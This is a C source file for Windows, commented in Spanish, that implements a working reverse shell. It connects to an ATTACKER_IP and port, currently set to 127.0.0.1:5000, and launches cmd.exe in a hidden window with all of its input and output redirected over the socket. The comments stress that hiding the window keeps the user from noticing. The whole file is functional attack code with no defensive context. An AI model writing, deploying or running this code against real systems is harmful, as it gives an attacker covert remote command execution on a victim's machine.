#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_PORT 5000

#pragma comment(lib, "ws2_32.lib")

int main() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error inicializando Winsock\n");
        return 1;
    }

    // Create socket
    SOCKET sock;
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("Error creando socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Connect     
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_port = htons(ATTACKER_PORT);
    
    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Error conectando: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Set up process information
    STARTUPINFO si;             // Configuración de cómo quiero que se inicie cmd.exe
    PROCESS_INFORMATION pi;     // Información sobre el proceso de cmd.exe que se creó
    
    // LIMPIA toda la estructura STARTUPINFO, llenándola de ceros (0x00)
    ZeroMemory(&si, sizeof(si));
    // Asigna el tamaño de la estructura STARTUPINFO al campo cb
    // Esto es OBLIGATORIO - Windows usa este valor para verificar la versión de la estructura
    si.cb = sizeof(si); 
    // Configura los flags que indican qué campos de la estructura están activos:
    // STARTF_USESTDHANDLES - Habilita el uso de handles personalizados para entrada/salida
    // STARTF_USESHOWWINDOW - Habilita la configuración de visibilidad de la ventana
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    // Establece que la ventana del proceso se cree en estado oculto
    // Esto evita que aparezca una ventana de cmd.exe visible para el usuario
    si.wShowWindow = SW_HIDE;
    // REDIRECCIÓN CRÍTICA: Asigna el socket como los tres canales de comunicación del proceso
    // hStdInput  - La entrada (comandos) vendrá del socket en lugar del teclado
    // hStdOutput - La salida normal se enviará al socket en lugar de la pantalla  
    // hStdError  - Los mensajes de error se enviarán al socket en lugar de la pantalla
    // (HANDLE)sock - Convierte el socket en un handle de Windows válido
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Start cmd.exe
    if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Proceso cmd.exe iniciado\n");
        
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Clean up
        closesocket(sock);
        WSACleanup();
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("Error iniciando cmd.exe: %d\n", GetLastError());
    }

    return 0;
}